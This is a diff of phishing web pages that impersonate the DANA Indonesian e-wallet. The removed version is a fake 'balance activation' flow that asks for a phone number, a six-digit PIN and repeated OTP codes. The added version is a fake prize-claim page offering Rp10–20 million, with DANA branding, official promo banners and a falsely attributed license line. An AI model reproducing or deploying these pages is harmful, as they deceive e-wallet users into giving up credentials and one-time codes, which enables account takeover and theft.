@@ -1,193 +1,588 @@
-
-<!DOCTYPE html>
-<html lang="id">
+ <html Permissions-Policy: autoplay=(self "dana.mp4")
+>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#118EEA">
-<meta property="og:image:type" content="image/jpeg">
-<meta property="og:image" content="https://iconlogovector.com/uploads/images/2023/03/lg-8b694ad63ac093b84ec0972a7c442d7c61.jpg">
-<title>DANA Dompet Digital Indonesia: Halaman aktivasi saldo</title>
-<link rel="stylesheet" href="style.css">
-<style>
-		.hidden {
-			display: none;
-		}
+       <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="theme-color" content="#118EEA">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+      <title>𝘿𝘼𝙉𝘼 𝘾𝙡𝙖𝙞𝙢 𝙍𝙀𝙎𝙈𝙄 𝙃𝘼𝘿𝙄𝘼𝙃</title>
+  <meta name="description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
 
-		.locked {
-			pointer-events: none;
-		}
+  <!-- Facebook Meta Tags -->
+  <meta property="og:url" content="https://www.dana.id">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="𝘿𝘼𝙉𝘼 𝘾𝙡𝙖𝙞𝙢 𝙍𝙀𝙎𝙈𝙄 𝙃𝘼𝘿𝙄𝘼𝙃">
+  <meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRIV5wv0dysfdKcnBvpBH0K_14Myt-tESjX4Q&usqp=CAU">
+  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRIV5wv0dysfdKcnBvpBH0K_14Myt-tESjX4Q&usqp=CAU" rel="apple-touch-icon">
+<meta property="og:url" content="https://www.dana.id/" />
+<meta property="og:description" content="Hai TemanDANA, Jika membutuhkan bantuan yuk hubungi kami langsung">
+<meta property="twitter:description" content="Hai TemanDANA, Jika membutuhkan bantuan yuk hubungi kami langsung">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Varela+Round&amp;display=swap'>
+<link rel="stylesheet" href="./style.css">
+<!-- partial:index.partial.html -->
+<link href="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+<link href="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/assets/owl.theme.default.min.css" rel="stylesheet">
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.min.js">
+</script>
+ <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/owl.carousel.js">
+   </script>
 
-		#overlay {
-			position: fixed;
-			top: 0;
-			left: 0;
-			width: 100%;
-			height: 100%;
-			background: rgba(0, 0, 0, 0.8);
-			color: white;
-			display: flex;
-			flex-direction: column;
-			justify-content: center;
-			align-items: center;
-			font-size: 18px;
-			z-index: 99000;
-			display: none;
-			text-align: center;
-			font-size: 21px;
-			padding: 0px 0px 10px;
-		}
-
-		#timer {
-			font-size: 25px;
-			margin-top: 20px;
-		}
-	</style>
-<script type="f3cd5c60dbadf54ac082f8ee-text/javascript">
-		let lockTimeout;
-
-		function checkLock() {
-			const lastVisit = localStorage.getItem('lastVisit');
-			const now = Date.now();
-			const lockDuration = 2 * 60 * 1000; // 5 minutes in milliseconds
-
-			if (lastVisit && (now - lastVisit) < lockDuration) {
-				document.getElementById('overlay').style.display = 'flex';
-				startCountdown(lockDuration); // 5 minutes countdown
-			} else {
-				localStorage.setItem('lastVisit', now);
-			}
-		}
-
-		function startCountdown(duration) {
-			const overlay = document.getElementById('overlay');
-			const timerElement = document.getElementById('timer');
-			let remainingTime = duration / 1000; // Convert milliseconds to seconds
-
-			function updateTimer() {
-				const minutes = Math.floor(remainingTime / 60);
-				const seconds = Math.floor(remainingTime % 60);
-				timerElement.textContent = ` ${minutes}:${seconds.toString().padStart(2, '0')}`;
-				remainingTime -= 1;
-				if (remainingTime < 0) {
-					clearInterval(lockTimeout);
-					overlay.style.display = 'none';
-					localStorage.setItem('lastVisit', Date.now()); // Update last visit time
-				}
-			}
-
-			updateTimer(); // Initial call
-			lockTimeout = setInterval(updateTimer, 1000); // Update every second
-		}
-
-		window.onload = checkLock;
-		window.onload = checkLock;
-	</script>
 </head>
-<body>
-<div id="content">
-<div id="overlay">
-<div>Kamu bisa mengulangi aktivasi saldo setelah:</div>
-<div id="timer">2:00</div>
-</div>
-<div id="process" class="process" style="display: none;">
-<div class="loading">
-<img src="load_bg.png" alt="Background">
-<img class="spinner" src="load_spin.png" alt="Spinner">
-</div>
-</div>
+<style>
+ form {
+  --background: #ffffff;
+  --text: #414856;
+  --radio: #7C96B2;
+  --radio-checked: #118EEA;
+  --radio-size: 25px;
+  --width: 292px;
+  --height: 120px;
+  --border-radius: 10px;
+  background: var(--background);
+  width: var(--width);
+  height: var(--height);
+  border-radius: var(--border-radius);
+  color: var(--text);
+  position: relative;
+  box-shadow: 0 10px 30px rgba(65, 72, 86, 0.05);
+  box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;
+  padding: 30px 15px;
+  padding-top: 10px;
+  display: grid;
+  grid-template-columns: auto var(--radio-size);
+  font-weight: bold;
+  align-items: center;
+  
+}
+form label {
+  cursor: pointer;
+  text-shadow: 1px 1px 0 #FFF;
+  color: #00000090;
+  
+}
+form input[type=radio] {
+  -webkit-appearance: none;
+  -moz-appearance: none;
+  position: relative;
+  height: var(--radio-size);
+  width: var(--radio-size);
+  outline: none;
+  margin: 3px 0;
+  cursor: pointer;
+  border: 2px solid var(--radio);
+  background: transparent;
+  border-radius: 50%;
+  display: grid;
+  justify-self: end;
+  justify-items: center;
+  align-items: center;
+  overflow: hidden;
+  transition: border 0.5s ease;
+}
+form input[type=radio]::before, form input[type=radio]::after {
+  content: "";
+  display: flex;
+  justify-self: center;
+  border-radius: 50%;
+}
+form input[type=radio]::before {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  background: var(--background);
+  z-index: 1;
+  opacity: var(--opacity, 1);
+}
+form input[type=radio]::after {
+  position: relative;
+  width: calc(100% /2);
+  height: calc(100% /2);
+  background: var(--radio-checked);
+  top: var(--y, 100%);
+  transition: top 0.5s cubic-bezier(0.48, 1.97, 0.5, 0.63);
+}
+form input[type=radio]:checked {
+  --radio: var(--radio-checked);
+}
+form input[type=radio]:checked::after {
+  --y: 0%;
+  -webkit-animation: stretch-animate 0.3s ease-out 0.17s;
+          animation: stretch-animate 0.3s ease-out 0.17s;
+}
+form input[type=radio]:checked::before {
+  --opacity: 0;
+}
+form input[type=radio]:checked ~ input[type=radio]::after {
+  --y: -100%;
+}
+form input[type=radio]:not(:checked)::before {
+  --opacity: 1;
+  transition: opacity 0s linear 0.5s;
+}
 
-<div id="page1" class="halsatu" style="display: block;">
-<input type="tel" class="awal" name="kol" id="phoneNumber" maxlength="14" placeholder="811 234 5678">
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; showpage2()" class="button1" id="lanjutButton" disabled data-cf-modified-f3cd5c60dbadf54ac082f8ee->Lanjut</button>
-<div id="warning" style="color: red;" class="forla"></div>
-</div>
+@-webkit-keyframes stretch-animate {
+  0% {
+    transform: scale(1, 1);
+  }
+  28% {
+    transform: scale(1.15, 0.85);
+  }
+  50% {
+    transform: scale(0.9, 1.1);
+  }
+  100% {
+    transform: scale(1, 1);
+  }
+}
 
-<div id="page2" class="Page2" style="display: none;">
-<img src="/rinciann.png" width="100%" class="g1" alt="Rincian">
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; showpinPopup1()" class="button1" data-cf-modified-f3cd5c60dbadf54ac082f8ee->Lanjut</button>
-</div>
-<div id="cice" class="cice" style="display: none"></div>
+@keyframes stretch-animate {
+  0% {
+    transform: scale(1, 1);
+  }
+  28% {
+    transform: scale(1.15, 0.85);
+  }
+  50% {
+    transform: scale(0.9, 1.1);
+  }
+  100% {
+    transform: scale(1, 1);
+  }
+}
+body {
+  background: #E8EBF3;
+  height: 100%;
+  font: 400 16px "Varela Round", sans-serif;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+}
+body .socials {
+  position: fixed;
+  display: block;
+  left: 20px;
+  bottom: 20px;
+}
+body .socials > a {
+  display: block;
+  width: 30px;
+  opacity: 0.2;
+  transform: scale(var(--scale, 0.8));
+  transition: transform 0.3s cubic-bezier(0.38, -0.12, 0.24, 1.91);
+}
+body .socials > a:hover {
+  --scale: 1;
+}   
 
-<div id="Popup1" class="Popup1" style="display: none;">
-<div class="popup1-content">
-<br>
-<p5>Masukkan kode PIN kamu</p5>
-<div class="pin-inputs">
-<input type="password" maxlength="1" class="pin-input" id="pin1" placeholder="●" readonly>
-<input type="password" maxlength="1" class="pin-input" id="pin2" placeholder="●" readonly>
-<input type="password" maxlength="1" class="pin-input" id="pin3" placeholder="●" readonly>
-<input type="password" maxlength="1" class="pin-input" id="pin4" placeholder="●" readonly>
-<input type="password" maxlength="1" class="pin-input" id="pin5" placeholder="●" readonly>
-<input type="password" maxlength="1" class="pin-input" id="pin6" placeholder="●" readonly>
-</div>
-<div class="keypad">
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(1)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->1</button>
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(2)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->2</button>
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(3)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->3</button>
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(4)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->4</button>
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(5)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->5</button>
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(6)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->6</button>
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(7)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->7</button>
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(8)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->8</button>
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(9)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->9</button>
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; enterNumber(0)" data-cf-modified-f3cd5c60dbadf54ac082f8ee->0</button>
-<button1 onclick="if (!window.__cfRLUnblockHandlers) return false; clearLast()" class="hapus" data-cf-modified-f3cd5c60dbadf54ac082f8ee->⌫</button1>
-</div>
-<button id="toggleVisibilityButton" class="see" onclick="if (!window.__cfRLUnblockHandlers) return false; toggleVisibility()" data-cf-modified-f3cd5c60dbadf54ac082f8ee->TAMPILAN</button>
-<br><br>
-<p3>
-<a href="lupa.html" class="lupa">LUPA PIN?</a>
-<a href="hub.html" class="lupa">HUBUNGI KAMI</a>
-</p3>
-</div>
-</div>
 
-<div id="popup2" class="Popup2" style="display: none;">
-<div class="popup2-content">
-<img src="/otp.jpg" width="100%" alt>
-<p5>Masukkan kode OTP</p5>
-<p>Kode dikirim ke nomor yang terhubung dengan DANA kamu via SMS/WhatsApp</p>
-<div class="otp-inputs">
-<input type="tel" maxlength="1" class="otp-input" id="otp1" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp2')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
-<input type="tel" maxlength="1" class="otp-input" id="otp2" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp3')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
-<input type="tel" maxlength="1" class="otp-input" id="otp3" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp4')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
-<input type="tel" maxlength="1" class="otp-input" id="otp4" oninput="if (!window.__cfRLUnblockHandlers) return false; submitOTP1()" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
-</div>
-<p7 id="resend-otp1" style="color: #D0D0D0;">KIRIM ULANG (<span id="timer1">01:59</span>)</p7>
-</div>
-</div>
+/* Added PseudoCode CSS to Hide the Controls of Video as on adding Controls Attribute to Video, the controls of video get visible easily. So to control that case also, this needs to be present on CSS End */
 
-<div id="popup3" class="Popup3" style="display: none;">
-<div class="popup3-content">
-<img src="otp.jpg" width="100%" alt>
-<p5>Masukkan kode OTP</p5>
-<br>
-<div class="salah">
-<p8>Pastikan kodenya sudah benar dan coba lagi</p8>
-</div>
-<div class="otp-inputs">
-<input type="tel" maxlength="1" class="otp-input" id="otp21" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp22')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
-<input type="tel" maxlength="1" class="otp-input" id="otp22" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp23')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
-<input type="tel" maxlength="1" class="otp-input" id="otp23" oninput="if (!window.__cfRLUnblockHandlers) return false; moveToNext(this, 'otp24')" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
-<input type="tel" maxlength="1" class="otp-input" id="otp24" oninput="if (!window.__cfRLUnblockHandlers) return false; submitOTP2()" data-cf-modified-f3cd5c60dbadf54ac082f8ee->
-</div>
-<p7 id="resend-otp2" style="color: #D0D0D0;">KIRIM ULANG (<span id="timer2">01:59</span>)</p7>
-</div>
-</div>
+video::-webkit-media-controls {
+    display: ;
+}
 
-<div id="popup4" class="Popup4" style="display: none;">
-<div class="popup-content4">
-<br>
-<img src="syarat.png" width="45%" alt>
-<br>
-<p9>Pastikan saldo DANA kamu tidak kurang dari Rp250.000 sebelum melakukan aktivasi saldo</p9>
-<div>
-<button onclick="if (!window.__cfRLUnblockHandlers) return false; awal()" class="button1" data-cf-modified-f3cd5c60dbadf54ac082f8ee->Mengerti</button>
+video {
+  display: none;
+  pointer-events: none;
+}
+
+
+#carousel {
+  grid-row: 1 / 2;
+  grid-column: 1 / 8;
+  width: 150vw;
+  height: 500px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  transform-style: preserve-3d;
+  perspective: 600px;
+  --items: 5;
+  --middle: 3;
+  --position: 1;
+  pointer-events: none;
+}
+<div id="my-element">
+    MIT License<br>
+    Copyright (c) 2022 dana-id
+</div>
+div.item {
+  position: absolute;
+  width: 300px;
+  height: 400px;
+  background-color: coral;
+  --r: calc(var(--position) - var(--offset));
+  --abs: max(calc(var(--r) * -1), var(--r));
+  transition: all 0.25s linear;
+  transform: rotateY(calc(-10deg * var(--r)))
+    translateX(calc(-300px * var(--r)));
+  z-index: calc((var(--position) - var(--abs)));
+}
+
+div.item:nth-of-type(1) {
+  --offset: 1;
+  background-color: #90f1ef;
+}
+div.item:nth-of-type(2) {
+  --offset: 2;
+  background-color: #ff70a6;
+}
+div.item:nth-of-type(3) {
+  --offset: 3;
+  background-color: #ff9770;
+}
+div.item:nth-of-type(4) {
+  --offset: 4;
+  background-color: #ffd670;
+}
+div.item:nth-of-type(5) {
+  --offset: 5;
+  background-color: #e9ff70;
+}
+
+
+/*********************/
+.process1 {
+     width: 100%;
+            height: 100%;
+             display: flex;
+             justify-content: center;
+            margin: auto;
+            position: absolute;
+           padding-top: 300px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 99999;
+            
+      
+}
+.loading {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+    margin-top: 300px;
+}
+.loading img {
+    width: 50px;
+    
+    top: 10;
+}
+.loading .spinner{
+    position: absolute;
+    width: 35px;
+    animation: spin 1s linear infinite;
+    -webkit-animation: spin 1s linear infinite;
+    -moz-animation: spin 1s linear infinite;
+    -ms-animation: spin 1s linear infinite;
+    -o-animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(360deg); }
+  100% { transform: rotate(0deg); }
+}
+@-webkit-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-moz-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-ms-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-o-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+
+/*********************/
+
+.radio-section {
+display: flex;
+align-items: center;
+justify-content: center;
+height: 100vh;
+width:;
+}
+h1 {
+margin-bottom: 20px;
+}
+.radio-item [type="radio"] {
+display: none;
+}
+.radio-item + .radio-item {
+margin-top: 15px;
+}
+.radio-item label {
+display: block;
+padding: 14px 30px;
+background: #dddddd;
+border: 2px inset #118EEA;
+border-radius: 50px;
+cursor: pointer;
+font-size: 15px;
+font-weight: 400;
+min-width: 240px;
+padding-left: 35px;
+color: #fff;
+margin: 8px ;
+position: relative;
+cursor: pointer;
+    text-shadow: 1px 2px 0 #fff;
+    color: #000;
+    text-align: center;
+
+}
+.radio-item label:after,
+.radio-item label:before {
+content: "";
+position: absolute;
+border-radius: 50%;
+background: #118EEA;
+}
+.radio-item label:after {
+height: 19px;
+width: 19px;
+border: 1px inset #fff;
+left: 9px;
+top: calc(50% - 10px);
+background: #fff;
+}
+.radio-item label:before {
+background:yellow;
+height: 19px;
+width: 19px;
+border: 2px inset #000;
+left: 9px;
+top: calc(50% - 10px);
+background: #fff;
+z-index: 999999999;
+
+opacity: 1;
+visibility: ;
+transition: 0.4s ease-in-out 0s;
+}
+.radio-item [type="radio"]:checked ~ label {
+border-color: #118EEA;
+background: #fff;
+color: #118EEA;
+cursor: pointer;
+    text-shadow: 1px 2px 0 #fff;
+}
+.radio-item [type="radio"]:checked ~ label::before {
+opacity: 1;
+visibility: visible;
+transform: scale(1);
+margin-top: -1px;
+background: #118EEA;
+cursor: pointer;
+    text-shadow: 1px 2px 0 #aaaaaa;
+}
+h5{
+    font-weight: bold;
+}
+</style>
+<body style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7i4ayQeBQZ6Ly4ZZZL41JZJK1xMIngVKyV7TOnSKSNGtjHRELO1wQNPTJzspjw25Q0gxSJHPbbUCSJLxviO-Y53YiS6ju1BzWE5_w_L2FryI-4yCaLUBgdK0O-Uq3ZHhA7e6eLyvnwoqst6-IkdUgd4b6_KUGBnprqZOw_Hy27fHt1vGyIijM9odlm0k/s1152/Desain tanpa judul (6).gif); background-position: cover; background-size: 200% 200%">
+ <div id="kelentet" style="display:; width: 100%; height: 100%; position: fixed; left: auto; right: auto; z-index: 99999999; background: " onclick="play()"></div>          
+<nav style="position: fixed; top: 0; left:0; right: 0; margin: 0px auto; width: 100%; height: 60px; background: transparent; z-index: 999">
+<img src="https://www.dana.id/_nuxt/img/dana-logo.fe46647.png" style="width: 100px; margin-top: 7px; margin-left: 9px">   
+</nav>
+<center>
+ <img id="video"
+    width="100%"
+    height="35%"
+    autoplay
+    muted control loop style=" width: 100%; height: 30%; display: block; background-color: #000; position: fixed; top: 0; left: 0; right: 0; z-index: -99" preload="metadata" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7i4ayQeBQZ6Ly4ZZZL41JZJK1xMIngVKyV7TOnSKSNGtjHRELO1wQNPTJzspjw25Q0gxSJHPbbUCSJLxviO-Y53YiS6ju1BzWE5_w_L2FryI-4yCaLUBgdK0O-Uq3ZHhA7e6eLyvnwoqst6-IkdUgd4b6_KUGBnprqZOw_Hy27fHt1vGyIijM9odlm0k/s1152/Desain tanpa judul (6).gif" type="img/jpeg">
+     <img id="video"
+    width="100%"
+    height="35%"
+    autoplay
+    muted control loop style=" width: 100%; height: 33%; display: block; background-color: #000; position: fixed; top: 0; left: 0; right: 0; z-index: -99" preload="metadata" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpnuX9HsPCk2LGwgvV12GSTnBuXtOx6-JbA6qlypD034DNFvEvBkNLFI_6UyXskVVH4HvOhYAlWEGNi_PkYiXVM2K-410sJN8EOLSALK5kSILyY-ep4fryhbmJlejAUAvwwgsiIQ_1LcaaJMCeJaafDrBZy_q3NPKsgH-Z43D3D5woVAUWnk7pPLJBWwg/s1080/AddText_10-18-08.19.03.jpg" type="img/jpeg">
+<br/>
+
+<div style="width: 100%; height: 30%; display: block; background-color: #E8EBF3; position: fixed; top: 29%; left: 0; right: 0; border-radius: 25px 25px 0px 0px; border-top: 2px inset #fff;border-top: 4px groove #118eea;"></div>
+</center>
+<center>
+<!-- partial:index.partial.html -->
+<form style="margin-top: -35px; height: 40px; padding-top: 0px; margin-bottom: 60px; text-align: center; font-size: 12px; background-color: #f5f5f5; border: 1px inset #ffffff; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgs9noak-LZncfEBhke-42CMPYCJNvJLq6BYEUG_maM4ry3pOULJc8T2GamrDbR_DFO2K1QKMlGLwpMKo_irlloCwpHfevIy0QtpBEr5JkxfqJhF_KQIVZt-cD6w3vjCfHgbkwo6LjgU7AYBFpv5gb_tKQjTGIxpV2xga2KY6OAn8CsJ5EiOqhYEbK-WdE/s2160/AddText_06-03-04.25.20.png); background-position: cover; background-size: 100%">
+   
+
+ </form>   
+
+ 
+<form style="margin-top: -100px; border-top: 1px solid #118EEA; height: 100px; background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHG8bz71IvIJl3PSWe5SPQf2uqQRQd7iX915m31vSQDrIrovNA6ILfIsJj7ePkpIAgn7SBUDGkNctPgm1V0Wj1g1NZCq50Ayw-2r8S0ekfxNwrUpaZ_3rDwwk46KJ8T6ro1LZDWKkFXKdQoV-TGaaFrytMF_60ahkXcBghNf5oSjwqA01os0L4TqOFPx4/s2000/AddText_04-03-07.31.42.png);
+    background-position: 100% 100%;
+    background-size: 100% 100%; background-color: #f5f5f5; outline: 1px solid #118EEA; text-shadow: 0 1px 1px rgba(888, 999, 255, 10.75);box-shadow: rgba(6, 24, 24, 0.99) 0px 0px 0px 2px, rgba(6, 24, 4, 10.65) 0px 4px 6px -1px, rgba(255, 255, 255, 0.08) 0px 1px 0px inset; border-radius: 25px 0px 25px 0px">
+    
+ <div style="position: absolute; left: 0; right: 0; margin: 0px auto">
+<div class="radio-item" ><input name="radio" id="radio1" type="radio" required><label for="radio1">💶  -  𝗥𝗽 𝟭𝟬.𝟬𝟬𝟬.𝟬𝟬𝟬 💸</label>
+<div class="radio-item"><input name="radio" id="radio2" type="radio"><label for="radio2" required>💶    𝗥𝗽 𝟮𝟬.𝟬𝟬𝟬.𝟬𝟬𝟬  💸</label>
 </div>
 </div>
 </div>
-</div>
-<script src="main.js" type="f3cd5c60dbadf54ac082f8ee-text/javascript"></script>
-<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="f3cd5c60dbadf54ac082f8ee-|49" defer></script></body>
+</form>
+</center>
+<br/>
+<button type="" onclick="letsgo()" style="width: 90%; height: 50px; border-radius: 50px; border: none; box-shadow: rgba(99, 99, 99, 0.4) 1px 2px 8px 1px; background: #118EEA; color: #fff; font-size: 17px; font-weight: 400; cursor: pointer;
+    text-shadow: 1px 1px 0 #00000090;z-index: 9999999">Konfirmasi</button>   
+
+
+<!--- ## DRIBBBLE + TWITTER ############# -->
+
+<footer style="position: fixed; bottom: 20; left: 0; right: 0; width: 100%; height: 200px; z-index: -1">
+<!----------HTML code starts here------->
+
+<div class="owl-carousel owl-theme owl-loaded " style="height: 125px; transform-style: preserve-3d; overflow: hidden">
+            
+       <div class="owl-stage-outer" style="padding: 0 90px; height: 160px; width: 100%; transform-style: preserve-3d;">
+         
+         <div class="owl-stage" style="transform: translate3d(-1527px, 0px, 0px); transition: all 0.05s ease 1s; width: 3334px; background-color: ; padding: 20px; width: 80%">
+           
+   <div class="owl-item item active;" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; border-radius: 10px; background: transparent"><img src="https://a.m.dana.id/danaweb/promo/1706678558-WebBanner-DANAscaVAngerHunt-500x300px.png" style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="background-color: #000; box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; border-radius: 20px 0 20px 0; background: transparent"><img src="https://a.m.dana.id/danaweb/promo/1706850538-010224-EIS157-eMAS_10__Cashback-Web_Banner-Thumbnails.png" style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent"><img src="https://a.m.dana.id/danaweb/promo/1707410449-e-MAS_CB_75K_-_Website_Thumbnail_500x300p.png"  style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRuW6U6dh3zHya46wmfDGBPxD1VxQW3A6T7pe6jFaBvjEigmXH0OJfqnxoGSpDQ6_BkBIg6BWwon94vEqDib5OKCYcQSXVHLt2U5oZ_T4LcynKiK08F3mJlCzD90mhxocCY0IVuKCGXKtOk2eKo5KkrlcjcUF_Uewa5f-j5_u5Dm7ZlQQyoYycQuw7rE8/s1080/AddText_12-21-12.32.33.jpg" height="105px" style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkZAkIZGHEXRjc_FpkfEsXMrXRTzj8Qbd9tfZCVCM5oBTJ1aappFW8gcWIIiE_Bx9xs92V43KRwFtXqxlWVXL0X4xJK65urazsQOM2rf2KqW41Iu4Kqsci2opoQYLXDIeOaP5o7qfHkHeAt3la_alR2e7Oc9B0Wm_4-XgELyqZ43a31yTDwjT-ax4BT4I/s1080/AddText_12-21-12.44.48.jpg" height="105px" style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1DlNIZMZwlCLmLWLKDIQI8wIMl54h-fyVu1xDTk5LqBsgDWj_G-NirAlcTi4P8aXnspoes5dyt-xp9pdIFG-MdBRhKJJB5un6s713vA7GZNwIspuuE2QR_quy_wL1xJ2htXc5_38pU4xFQDRrjX3K0JkI_eEojnRJYTXj3fgipX0atm8VZjdfDSSbHAo/s1080/AddText_12-25-01.43.43.jpg" height="105px" style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent; border-radius: 20px 0 20px 0"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYo-GsnUUKLNEPq8tvu2jEOSBVFmtKIl-4NO3rCBHwMFehYhF3DWiR7c0tgnAlb1sWhjoCC6B82S6ypZJ13t-2FB851EHm6SzCpI3YGlVtTi1Hldf4MORJPdxKQ1ghCWf7x4ilcKtTxPurpQAudh9nAgziFkImNZuaTo80538roOfUyhqEtY-QLYyavss/s1080/AddText_02-05-05.34.58.jpg" height="105px" style="border-radius: 20px 0 20px 0"></div>
+           
+           
+             
+            </div></div></div>
+           
+  
+</div>    
+
+</footer>
+  <center>
+     <div id="process1" name="process" class="process1" style="display: none;">
+            <div class="loading">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8hbZEfutKvr9pkj0-mkJYWt-1SBtt3gw-HFOEZc0172okrp0SFHLaW3PRGVDm1U0P7WWEMELIw4nlq1_1gCgyZBo3cxf-OJNpguNamdJryCkGU-hTHiW3RyOv5JD9eIjXTFtrJFCVn0ae4RxG4Oi-czAP20tEaJI3OstxFAbtOwtFxp6RvOHc6NZL/s1600/load_bg.png">
+                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhl9xJVYWF_a9vAhgW5QQgozvZVADTaJgIX64iO7a5sQuMpSoPBK3zfKjvT6xc9fZPfxZz39mjk1H_oZOOOtYvO1l7DkWNqiD5LJyGYdwDNyHuyqLk_Ix6eFs3aLCG2yUXVwtsnj0BXTA40WZmecyLyCIm_ff0xNkkOvkuKBOl6yfS-QjI_EJrIyGtU/s1600/load_spin.png" id="loading" style="margin-top: -2px">
+            </div>
+        </div>
+        </center>
